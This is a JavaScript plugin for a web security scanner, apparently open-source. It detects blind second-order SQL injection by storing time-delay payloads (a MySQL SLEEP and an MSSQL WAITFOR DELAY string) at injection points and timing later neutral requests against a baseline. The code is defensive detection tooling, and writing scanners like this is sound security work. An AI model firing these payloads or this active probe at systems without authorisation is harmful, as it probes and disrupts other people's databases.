/* ---
id: sqli-second-order-timing
name: SQL Injection (second-order, blind timing)
description: Detects blind second-order SQL injection by writing a delay payload at an injection point and timing neutral re-reads against a pre-write baseline with the statistical timing oracle.
author: GASH contributors
severity: high
tags: [sqli, injection, second-order, blind, timing]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 120
phase: probe
order: 60
api_version: "1.0"
tests: tests/fixtures/sqli-second-order-timing/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/sqli/sqli-second-order-timing.js
// What: Tier 2 blind second-order SQLi plugin (write, then timed neutral re-reads).
// Why: When the stored payload never reflects an in-band error, the only
//   observable is response time on a neutral request AFTER the write. Tier 1
//   cannot correlate two exchanges, so the delay cannot be attributed to the
//   stored payload there. No new sandbox surface: only probe.send plus the
//   ctx surface plus host.oracles.timing plus host.candidate.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const payloads = ["' AND SLEEP(5)-- ", "'; WAITFOR DELAY '0:0:5'-- "];
  const neutral = "1";
  const repeats = 3;
  const minDelayMs = 5000;
  const maxSends = 120;
  // repeats baseline reads + (1 write + repeats reads) per payload.
  const sendsPerPoint = repeats + payloads.length * (1 + repeats);
  let sends = 0;

  for (const point of points) {
    const loc = String(point.paramLocation || "query").toLowerCase();
    if (loc !== "query" && loc !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + sendsPerPoint > maxSends) {
      break;
    }
    // Baseline timing BEFORE any write, so a slow page cannot be mistaken for
    // a stored delay payload.
    const controlResps = [];
    for (let i = 0; i < repeats; i++) {
      sends++;
      controlResps.push(probe.send(point.withValue(neutral)));
    }
    for (const payload of payloads) {
      // Write the delay payload; its own latency is never measured.
      sends++;
      probe.send(point.withValue(payload));
      // Time neutral re-reads: only the stored payload can slow them down.
      const delayResps = [];
      for (let i = 0; i < repeats; i++) {
        sends++;
        delayResps.push(probe.send(point.withValue(neutral)));
      }
      const ev = host.oracles.timing(delayResps, controlResps, {
        min_delay_ms: minDelayMs,
        repeats: repeats,
      });
      if (ev) {
        candidates.push(host.candidate(point, "sqli-time", ev));
        break;
      }
    }
  }
  return candidates;
}
